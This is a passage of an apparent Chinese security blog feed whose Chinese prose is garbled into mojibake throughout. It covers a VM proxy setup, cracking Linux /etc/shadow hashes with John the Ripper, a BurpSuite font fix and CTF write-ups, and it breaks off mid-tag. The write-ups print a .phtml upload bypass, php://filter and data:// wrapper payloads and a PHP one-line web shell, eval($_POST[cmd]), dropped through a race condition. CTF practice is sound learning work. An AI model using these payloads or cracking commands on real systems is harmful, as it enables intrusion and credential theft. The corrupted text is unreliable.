è™šæ‹Ÿæœºä¸Šç”¨ã€è®¾ç½®ã€‘é…ç½®ä»£ç†<br>ç”¨ã€è®¾ç½®ã€‘é…ç½®ä»£ç†ï¼Œä»£ç†è®¾ç½®ä¼šå½±å“æ‰€æœ‰å›¾å½¢appï¼Œ æ¯”å¦‚æµè§ˆå™¨ï¼Œshellâ€¦</p><p>ä½†æ˜¯å´å½±å“ä¸äº†ssh(ç”¨sshè¿æ¥è™šæ‹Ÿæœºubuntu)ç»ˆç«¯ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨sshè¿˜éœ€è¦é…ç½®ä»£ç†ï¼Œå‚è€ƒç¬¬ä¸ƒèŠ‚ã€‚</p><p>å½“ç„¶è¿™ç§é…ç½®ä¹Ÿå½±å“ä¸äº†å¾ˆå¤šéœ€è¦å•ç‹¬é…ç½®ä»£ç†çš„app, æ¯”å¦‚conda, pip, dockerç­‰ç­‰</p><p>è¿›å…¥è™šæ‹Ÿæœºï¼Œé…ç½®ip,å¦‚æœæ˜¯Ubuntuå¯ä»¥å‚è€ƒä¸‹é¢çš„é…ç½®ï¼š(æ³¨æ„ä¸‹å›¾çš„ç«¯å£ï¼Œè¦è·Ÿä»£ç†è½¯ä»¶çš„ç«¯å£ä¸€è‡´)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>ç„¶åå¯ä»¥æ‰“å¼€æµè§ˆå™¨çœ‹å¤–ç½‘ï¼Œæˆ–è€…ç»ˆç«¯ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§vmè™šæ‹Ÿæœºå¦‚ä½•å®ç°ä¸ä¸»æœºå…±äº«ä»£ç†å®ç°ç§‘å­¦ä¸Šç½‘;è½¯ä»¶ä»£ç†ä½¿ç”¨tunæ¨¡å¼;ç³»ç»Ÿä»£ç†è®¾ç½®æ–¹æ³•</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>linuxã€windowså¯†é’¥æš´åŠ›ç ´è§£å·¥å…·johnçš„ä½¿ç”¨</title>
    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
    <published>2025-03-18T16:00:00.000Z</published>
    <updated>2025-03-19T14:19:17.023Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="ä»€ä¹ˆæ˜¯john">ä»€ä¹ˆæ˜¯john</h4><p><code>John the Ripper</code> æ˜¯ä¸€æ¬¾å¤§å—æ¬¢è¿çš„ã€å…è´¹çš„å¼€æºè½¯ä»¶ã€‚ä¹Ÿæ˜¯ä¸€ä¸ªåŸºäºå­—å…¸çš„å¿«é€Ÿç ´è§£å¯†ç çš„å·¥å…·ï¼Œæ˜¯ä¸€æ¬¾ç”¨äºåœ¨å·²çŸ¥å¯†æ–‡çš„æƒ…å†µä¸‹å°è¯•ç ´è§£å‡ºæ˜æ–‡çš„ç ´è§£å¯†ç è½¯ä»¶ï¼Œæ”¯æŒç›®å‰å¤§å¤šæ•°çš„åŠ å¯†ç®—æ³•ï¼Œå¦‚ <code>DES</code> ã€ <code>MD4</code> ã€ <code>MD5</code> ç­‰ã€‚ <code>John the Ripper</code> æ”¯æŒå­—å…¸ç ´è§£æ–¹å¼å’Œæš´åŠ›ç ´è§£æ–¹å¼ã€‚å®ƒæ”¯æŒå¤šç§ä¸åŒç±»å‹çš„ç³»ç»Ÿæ¶æ„ï¼ŒåŒ…æ‹¬ <code>Unix</code> ã€ <code>Linux</code> ã€ <code>Windows</code> ã€ <code>DOS</code> æ¨¡å¼ã€ <code>BeOS</code> å’Œ <code>OpenVMS</code> ï¼Œä¸»è¦ç›®çš„æ˜¯ç ´è§£ä¸å¤Ÿç‰¢å›ºçš„ <code>Unix/Linux</code> ç³»ç»Ÿå¯†ç ã€‚</p><p>johnä¸€èˆ¬æ˜¯kaliè‡ªå¸¦ã€‚</p><h4 id="johnå‚æ•°è¡¨">johnå‚æ•°è¡¨</h4><p><code>john</code> å‘½ä»¤çš„å…·ä½“å‚æ•°é€‰é¡¹å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>é€‰ é¡¹</th><th>æ è¿°</th></tr></thead><tbody><tr><td>â€“single</td><td>single crack æ¨¡å¼ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶ä¸­çš„è§„åˆ™è¿›è¡Œç ´è§£</td></tr><tr><td>â€“wordlist=FILEâ€“stdin</td><td>å­—å…¸æ¨¡å¼ï¼Œä» FILE æˆ–æ ‡å‡†è¾“å…¥ä¸­è¯»å–è¯æ±‡</td></tr><tr><td>â€“rules</td><td>æ‰“å¼€å­—å…¸æ¨¡å¼çš„è¯æ±‡è¡¨åˆ‡åˆ†è§„åˆ™</td></tr><tr><td>â€“incremental[=MODE]</td><td>ä½¿ç”¨å¢é‡æ¨¡å¼</td></tr><tr><td>â€“external=MODE</td><td>æ‰“å¼€å¤–éƒ¨æ¨¡å¼æˆ–å•è¯è¿‡æ»¤ï¼Œä½¿ç”¨ [List.External:MODE] èŠ‚ä¸­å®šä¹‰çš„å¤–éƒ¨å‡½æ•°</td></tr><tr><td>â€“stdout[=LENGTH]</td><td>ä¸è¿›è¡Œç ´è§£ï¼Œä»…ä»…æŠŠç”Ÿæˆçš„ã€è¦æµ‹è¯•æ˜¯å¦ä¸ºå£ä»¤çš„è¯æ±‡è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸Š</td></tr><tr><td>â€“restore[=NAME]</td><td>æ¢å¤è¢«ä¸­æ–­çš„ç ´è§£è¿‡ç¨‹ï¼Œä»æŒ‡å®šæ–‡ä»¶æˆ–é»˜è®¤ä¸º $JOHN/john.rec çš„æ–‡ä»¶ä¸­è¯»å–ç ´è§£è¿‡ç¨‹çš„çŠ¶æ€ä¿¡æ¯</td></tr><tr><td>â€“session=NAME</td><td>å°†æ–°çš„ç ´è§£ä¼šè¯å‘½åä¸º NAME ï¼Œè¯¥é€‰é¡¹ç”¨äºä¼šè¯ä¸­æ–­æ¢å¤å’ŒåŒæ—¶è¿è¡Œå¤šä¸ªç ´è§£å®ä¾‹çš„æƒ…å†µ</td></tr><tr><td>â€“status[=NAME]</td><td>æ˜¾ç¤ºä¼šè¯çŠ¶æ€</td></tr><tr><td>â€“make-charset=FILE</td><td>ç”Ÿæˆä¸€ä¸ªå­—ç¬¦é›†æ–‡ä»¶ï¼Œè¦†ç›– FILE æ–‡ä»¶ï¼Œç”¨äºå¢é‡æ¨¡å¼</td></tr><tr><td>â€“show</td><td>æ˜¾ç¤ºå·²ç ´è§£å£ä»¤</td></tr><tr><td>â€“test</td><td>è¿›è¡ŒåŸºå‡†æµ‹è¯•</td></tr><tr><td>â€“users=[-]LOGIN|UID[,â€¦]</td><td>é€‰æ‹©æŒ‡å®šçš„ä¸€ä¸ªæˆ–å¤šä¸ªè´¦æˆ·è¿›è¡Œç ´è§£æˆ–å…¶ä»–æ“ä½œï¼Œåˆ—è¡¨å‰çš„å‡å·è¡¨ç¤ºåå‘æ“ä½œï¼Œè¯´æ˜å¯¹åˆ—å‡ºè´¦æˆ·ä¹‹å¤–çš„è´¦æˆ·è¿›è¡Œç ´è§£æˆ–å…¶ä»–æ“ä½œ</td></tr><tr><td>â€“groups=[-]GID[,â€¦]</td><td>å¯¹æŒ‡å®šç”¨æˆ·ç»„çš„è´¦æˆ·è¿›è¡Œç ´è§£ï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œï¼Œè¯´æ˜å¯¹åˆ—å‡ºç»„ä¹‹å¤–çš„è´¦æˆ·è¿›è¡Œç ´è§£ã€‚</td></tr><tr><td>â€“shells=[-]SHELL[,â€¦]</td><td>å¯¹ä½¿ç”¨æŒ‡å®š shell çš„è´¦æˆ·è¿›è¡Œæ“ä½œï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œ</td></tr><tr><td>â€“salts=[-]COUNT</td><td>è‡³å°‘å¯¹ COUNT å£ä»¤åŠ è½½åŠ ç›ï¼Œå‡å·è¡¨ç¤ºåå‘æ“ä½œ</td></tr><tr><td>â€“format=NAME</td><td>æŒ‡å®šå¯†æ–‡æ ¼å¼åç§°ï¼Œä¸º DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM ä¹‹ä¸€</td></tr><tr><td>â€“save-memory=LEVEL</td><td>è®¾ç½®å†…å­˜èŠ‚çœæ¨¡å¼ï¼Œå½“å†…å­˜ä¸å¤šæ—¶é€‰ç”¨è¿™ä¸ªé€‰é¡¹ã€‚ LEVEL å–å€¼åœ¨ 1~3 ä¹‹é—´</td></tr></tbody></table><h4 id="etc-passedå’Œetc-shadowæ–‡ä»¶">etc/passedå’Œetc/shadowæ–‡ä»¶</h4><p>é¦–å…ˆè¦çŸ¥é“ /etc/passwdæ–‡ä»¶å’Œ /etc/shadowæ–‡ä»¶</p><p>/etc/passwdæ–‡ä»¶æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ•°æ®ä¸ºpasswdæ–‡ä»¶çš„ä¸€ä¸ªç‰‡æ®µï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ¯ä¸€è¡Œéƒ½è¢«<code>åˆ†å·</code>åˆ†ä¸ºäº†<code>7éƒ¨åˆ†</code>ã€‚è¿™ä¸ƒéƒ¨åˆ†åˆ†åˆ«ä¸ºï¼š</p><blockquote><ol><li>ç”¨æˆ·å</li><li>å¯†ç (passwdæ–‡ä»¶äººäººå¯è¯»ï¼Œæ‰€ä»¥ä¸æ”¾æ˜æ–‡å¯†ç ï¼ŒçœŸæ­£çš„å¯†ç åœ¨/etc/shadowæ–‡ä»¶ä¸­)</li><li>uid</li><li>gid</li><li>ç”¨æˆ·æ³¨é‡Š</li><li>ä¸»ç›®å½•</li><li>ç™»é™†çš„shellç±»å‹(bash/zsh/shç­‰)</li></ol></blockquote><p>/etc/shadowæ–‡ä»¶æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯è¢«åˆ†å·éš”å¼€æ ¼å¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å</span><br><span class="line">å¯†ç ï¼Œå…¶ä¸­\$6\$æ˜¯è¡¨ç¤ºä¸€ç§ç±»å‹æ ‡è®°ä¸º6çš„å¯†ç æ•£åˆ—suans fa,è¿™é‡ŒæŒ‡SHA-512å“ˆå¸Œç®—æ³•ï¼Œ1 ä»£è¡¨ MD5ï¼Œ5 ä»£è¡¨ SHA-256ï¼Œ6 ä»£è¡¨ SHA-512,salt è¡¨ç¤ºå¯†ç å­¦ä¸­çš„ Salt, ç³»ç»Ÿéšæœºç”Ÿæˆ encrypted è¡¨ç¤ºå¯†ç çš„ hash,å…¶ä¸­f0EotKbwä¸ºsaltã€‚</span><br><span class="line">â€œæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´â€è¡¨ç¤ºçš„æ˜¯ä»æŸä¸ªæ—¶åˆ»èµ·ï¼Œåˆ°ç”¨æˆ·æœ€åä¸€æ¬¡ä¿®æ”¹å£ä»¤æ—¶çš„å¤©æ•°ã€‚æ—¶é—´èµ·ç‚¹å¯¹ä¸åŒçš„ç³»ç»Ÿå¯èƒ½ä¸ä¸€æ ·ã€‚ä¾‹å¦‚åœ¨SCOLinuxä¸­ï¼Œè¿™ä¸ªæ—¶é—´èµ·ç‚¹æ˜¯1970å¹´1æœˆ1æ—¥ã€‚</span><br><span class="line">â€œæœ€å°æ—¶é—´é—´éš”â€æŒ‡çš„æ˜¯ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´æ‰€éœ€çš„æœ€å°å¤©æ•°ã€‚</span><br><span class="line">â€œæœ€å¤§æ—¶é—´é—´éš”â€æŒ‡çš„æ˜¯å£ä»¤ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚</span><br><span class="line">â€œè­¦å‘Šæ—¶é—´â€å­—æ®µè¡¨ç¤ºçš„æ˜¯ä»ç³»ç»Ÿå¼€å§‹è­¦å‘Šç”¨æˆ·åˆ°ç”¨æˆ·å¯†ç æ­£å¼å¤±æ•ˆä¹‹é—´çš„å¤©æ•°ã€‚</span><br><span class="line">â€œä¸æ´»åŠ¨æ—¶é—´â€è¡¨ç¤ºçš„æ˜¯ç”¨æˆ·æ²¡æœ‰ç™»å½•æ´»åŠ¨ä½†è´¦å·ä»èƒ½ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚</span><br><span class="line">â€œå¤±æ•ˆæ—¶é—´â€å­—æ®µç»™å‡ºçš„æ˜¯ä¸€ä¸ªç»å¯¹çš„å¤©æ•°ï¼Œå¦‚æœä½¿ç”¨äº†è¿™ä¸ªå­—æ®µï¼Œé‚£ä¹ˆå°±ç»™å‡ºç›¸åº”è´¦å·çš„ç”Ÿå­˜æœŸã€‚æœŸæ»¡åï¼Œè¯¥è´¦å·å°±ä¸å†æ˜¯ä¸€ä¸ªåˆæ³•çš„è´¦å·ï¼Œä¹Ÿå°±ä¸èƒ½å†ç”¨æ¥ç™»å½•äº†ã€‚</span><br></pre></td></tr></table></figure><h4 id="çˆ†ç ´linuxç”¨æˆ·å¯†ç å®ä¾‹">çˆ†ç ´linuxç”¨æˆ·å¯†ç å®ä¾‹</h4><p><strong>åˆ©ç”¨ <code>unshadow</code> ç»„åˆ <code>/etc/passwd</code> å’Œ <code>/etc/shadow</code> ä¸¤ä¸ªæ–‡ä»¶</strong></p><p><code>unshadow</code> å‘½ä»¤ä¼šå°† <code>/etc/passwd</code> çš„æ•°æ®å’Œ <code>/etc/shadow</code> çš„æ•°æ®ç»“åˆèµ·æ¥ï¼Œåˆ›å»º <code>1</code> ä¸ªå«æœ‰ç”¨æˆ·åå’Œå¯†ç è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ç»“åˆèµ·æ¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>John the Ripper</code> ç ´è§£ <code>Linux</code> ç”¨æˆ·ç™»å½•å¯†ç </strong></p><p>æˆ‘ä»¬è¿™æ—¶å€™è¿˜éœ€è¦ä¸€ä¸ªå­—å…¸ï¼Œç”±äº <code>John</code> è‡ªå¸¦äº†ä¸€ä¸ªå­—å…¸ï¼Œå­—å…¸ä½äº <code>/usr/share/john/password.lst</code> ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥è‡ªè¡Œå»ç½‘ä¸Šé€‰æ‹©é€‚åˆä½ çš„å­—å…¸ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹Linuxç™»å½•ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç ´è§£ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>ç ´è§£ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ <code>test_passwd</code> æ–‡ä»¶ä¸­å­˜åœ¨çš„ä¸‰ä¸ªç”¨æˆ·å <code>root</code> ï¼Œ<code>test</code> ï¼Œ <code>python</code> çš„å¯†ç ï¼Œå‡è¢«ç ´è§£äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç ´è§£ä¿¡æ¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="å‡ºç°æŠ¥é”™ï¼š-UTF-8-No-password-hashes-loaded">å‡ºç°æŠ¥é”™ï¼š UTF-8 No password hashes loaded</h4><p>John the Ripper æ­£ç¡®ä½¿ç”¨æ–¹æ³•<br>ç°åœ¨ John the Ripper çˆ†ç ´linuxçš„shadowæ–‡ä»¶æ—¶éœ€è¦åŠ ä¸Š --format=crypt</p><p>æ‰€ä»¥ç°åœ¨ John the Ripper çš„ä½¿ç”¨å‘½ä»¤ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯ï¼Œå¦‚æœæŸ¥çœ‹åˆå¹¶åçš„æ–‡ä»¶æˆ–è€…æ²¡åˆå¹¶ä½¿ç”¨çš„shadowæ–‡ä»¶ï¼Œå¹¶åœ¨ç”¨æˆ·ååé¢çœ‹åˆ° <strong>$y$</strong>ï¼Œåˆ™è¡¨æ˜å¯†ç å·²ä½¿ç”¨ yescrypt è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§kaliä¸­æš´åŠ›ç ´è§£å·¥å…·johnçš„ä½¿ç”¨æ–¹æ³•ä»¥åŠå‘½ä»¤è§£æ;/etc/passwdæ–‡ä»¶å’Œ/etc/shadowæ–‡ä»¶æ ¼å¼;linuxå¯†ç çˆ†ç ´å®ä¾‹;å‡ºç°æŠ¥é”™ï¼šâ€œUTF-8 No password hashes loadedâ€çš„åŸå› åŠè§£å†³æ–¹æ³•</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuiteä¸­æ–‡ç‰ˆå‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µè§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/3f399677.html"/>
    <id>https://blog.m3x1.cn/posts/3f399677.html</id>
    <published>2025-03-17T16:00:00.000Z</published>
    <updated>2025-03-20T16:06:00.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h4><p>â€‹åœ¨ä½¿ç”¨BurpSuiteæ±‰åŒ–ç‰ˆæ—¶æŠ“å–httpæ•°æ®åŒ…å‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µï¼Œè¿™æ˜¯å› ä¸ºä¸­æ–‡ç‰ˆçš„å­—ä½“ä¸ä¸€æ ·å¯¼è‡´çš„ï¼Œéœ€è¦ä¿®æ”¹å­—ä½“ã€‚</p><h4 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h4><p>â€‹ä¿®æ”¹BurpSuiteæ±‰åŒ–ç‰ˆçš„httpå­—ä½“æ˜¾ç¤ºã€‚</p><p>æ‰“å¼€è®¾ç½®ï¼Œåœ¨message editorä¸­æ‰¾åˆ°â€œHTTPæ¶ˆæ¯çš„æ˜¾ç¤ºæ–¹å¼â€ï¼Œä¿®æ”¹å¦‚ä¸‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3f0228200b1b14ba279f13876b27bc1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§BurpSuiteä¸­æ–‡ç‰ˆå‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µè§£å†³-ä¿®æ”¹å­—ä½“</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>åˆ·é¢˜2025.3.15</title>
    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
    <published>2025-03-14T16:00:00.000Z</published>
    <updated>2025-03-18T14:15:08.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é¢˜ç›®æ¥æºï¼šNSSCTFå¹³å°</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload2-0">[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0</h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æµ‹è¯•ï¼Œé¦–å…ˆä¸Šä¼ jpgæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…æ”¹æˆphpæ–‡ä»¶ï¼Œç»“æœæç¤ºphpæ–‡ä»¶ä¸èƒ½ä¸Šä¼ ã€‚</p><p>ä¸Šä¼ htaccessæ–‡ä»¶ä¹Ÿä¸è¡Œï¼Œäºæ˜¯æ”¹æˆåç¼€ä¸ºphtmlã€‚</p><p>phtmlä¹Ÿä¼šè¢«å½“æˆphpè§£æã€‚</p><p>å‘ç°ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols">[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols</h4><blockquote><p>è€ƒç‚¹ï¼šPHPä¼ªåè®®ï¼Œæ–‡ä»¶åŒ…å«</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>å…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç„¶åçœ‹åˆ°éœ€è¦ä¼ å‚ï¼Œåˆè¦è¯»å–hint.phpï¼Œä½¿ç”¨filterä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²base64ï¼Œè§£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>ç›´æ¥ä½¿ç”¨dataåè®®ç»•è¿‡file_get_contentså‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-åŠ é€ŸåŠ é€Ÿ">[FSCTF 2023]åŠ é€ŸåŠ é€Ÿ</h4><blockquote><p>è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰</p></blockquote><p>å…ˆæŠŠåç¼€æ”¹æˆ.jpgæ‹¿åˆ°å¯¹æ–¹ä¿å­˜æ–‡ä»¶çš„è·¯å¾„ï¼Œä¸ºå½“å‰è·¯å¾„ä¸‹çš„uploadç›®å½•é‡Œã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">çœ‹è§æ ‡ç­¾æ˜¯æ¡ä»¶ç«äº‰ï¼Œé‚£å°±æŒ‰ç…§æ¡ä»¶ç«äº‰çš„æ–¹æ³•å»åšã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªjz-cmd.phpæ–‡ä»¶ï¼Œè¿è¡Œåˆ›å»ºcmd.phpæ–‡ä»¶å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬çš„å‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>å…ˆæŠ“å–ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œå†æŠ“å–è®¿é—®uploadæ–‡ä»¶å¤¹é‡Œçš„jz-cmd.phpè¿™ä¸¤ä¸ªæ•°æ®åŒ…ï¼›è™½ç„¶ä¸Šä¼ jz-cmd.phpæ˜¯ä¸è¢«å…è®¸çš„ï¼Œä½†å…¶å®è¿™ä¸ªæ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šæœ‰å­˜åœ¨è¿‡ï¼Œåªæ˜¯å¾ˆå¿«å°±è¢«åˆ é™¤äº†ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨BPç–¯ç‹‚å‘åŒ…è®¿é—®uploadæ–‡ä»¶å¤¹ä¸‹çš„jz-cmd.phpæ–‡ä»¶æ˜¯é“ç†çš„ã€‚è€Œåªè¦æ­¤jz-cmd.phpè¢«è®¿é—®æˆåŠŸï¼Œå°±ä¼šåœ¨uploadæ–‡ä»¶å¤¹é‡Œåˆ›å»ºcmd.phpè¿™ä¸ªåé—¨æ–‡ä»¶ã€‚</p><p>å…·ä½“æ“ä½œå°±æ˜¯æŠ“å–ä¸Šä¼ å’Œè®¿é—®çš„æ•°æ®åŒ…ï¼Œç„¶åå°†ä»–ä»¬éƒ½æ”¾å…¥intruderä¸­ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" 